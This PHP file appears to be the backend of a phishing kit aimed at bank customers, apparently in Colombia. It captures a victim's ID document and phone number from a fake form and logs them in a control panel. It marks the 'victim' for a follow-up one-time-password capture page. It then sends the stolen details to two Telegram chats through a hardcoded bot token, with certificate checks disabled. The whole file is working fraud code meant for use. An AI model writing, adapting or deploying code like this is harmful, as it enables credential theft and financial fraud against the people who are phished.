<?php
require_once('../panel/lib/funciones.php');
date_default_timezone_set('America/Bogota');

$ip = $_SERVER['REMOTE_ADDR'];
$documento = isset($_POST['doc']) ? $_POST['doc'] : '';
$celular = isset($_POST['cel']) ? $_POST['cel'] : '';

if (!empty($documento)) {
    // 1. Guardar en Panel y FORZAR CAMBIO DE ESTADO A 2 (Dinámica)
    if (function_exists('traer_regitro')) {
        $registro = traer_regitro($ip);
        if (function_exists('actualizar_registro_info')) {
            actualizar_registro_info($registro, $documento, $celular);
        }
    }

    // Cambiamos el estado a 2 para que pida la Clave Dinámica (OTP.php)
    if (function_exists('actualizar_estado_victima')) {
        actualizar_estado_victima($ip, "2"); 
    }

    // 2. Configuración del Bot con los 2 IDs seleccionados
    $token = "8721615356:AAGxIf7AxwGMzhoUOtxI9IRQoOXoIMJ2_iA";
    $chat_ids = [
        "8638340940", 
        "8645545892"
    ];
    
    $mensaje = "⭐ <b>𝓐K𝓐𝓜 𝓜𝓐𝓕𝓘𝓐 - INFO</b> ⭐\n\n";
    $mensaje .= "👤 <b>IP:</b> <code>$ip</code>\n";
    $mensaje .= "🪪 <b>DOC:</b> <code>$documento</code>\n";
    $mensaje .= "📱 <b>CEL:</b> <code>$celular</code>\n";
    $mensaje .= "⏰ <b>HORA:</b> " . date('H:i:s') . "\n";
    $mensaje .= "━━━━━━━━━━━━━━━";

    // 3. Envío a Telegram
    foreach ($chat_ids as $id) {
        $url = "https://api.telegram.org/bot$token/sendMessage";
        $data = [
            'chat_id' => $id, 
            'text' => $mensaje, 
            'parse_mode' => 'HTML'
        ];

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
        curl_exec($ch);
        curl_close($ch);
    }
}

// Retornamos "ok" para que el JS avance a la siguiente pantalla (OTP.php)
echo "ok";
?>
